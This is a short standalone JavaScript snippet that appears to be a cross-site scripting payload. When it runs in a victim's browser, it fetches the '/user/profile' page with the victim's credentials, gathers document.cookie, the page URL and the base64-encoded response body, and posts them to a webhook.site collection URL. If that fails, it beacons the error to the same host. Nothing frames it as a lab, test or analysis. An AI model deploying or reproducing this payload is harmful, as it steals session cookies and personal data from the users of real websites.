(async () => {
  const WEBHOOK = 'https://webhook.site/12a35676-d3a6-40e5-998b-f053b949ecbf';
  try {
    const r = await fetch('/user/profile', { credentials: 'include' });
    const body = await r.text();
    const payload = {
      url: location.href,
      origin: location.origin,
      status: r.status,
      cookies: document.cookie,
      body_b64: btoa(unescape(encodeURIComponent(body))).slice(0, 6000)
    };
    await fetch(WEBHOOK + '?t=' + Date.now(), {
      method: 'POST',
      mode: 'no-cors',
      headers: { 'Content-Type': 'text/plain' },
      body: JSON.stringify(payload)
    });
  } catch (e) {
    new Image().src = WEBHOOK + '?err=' + encodeURIComponent(e.message);
  }
})();
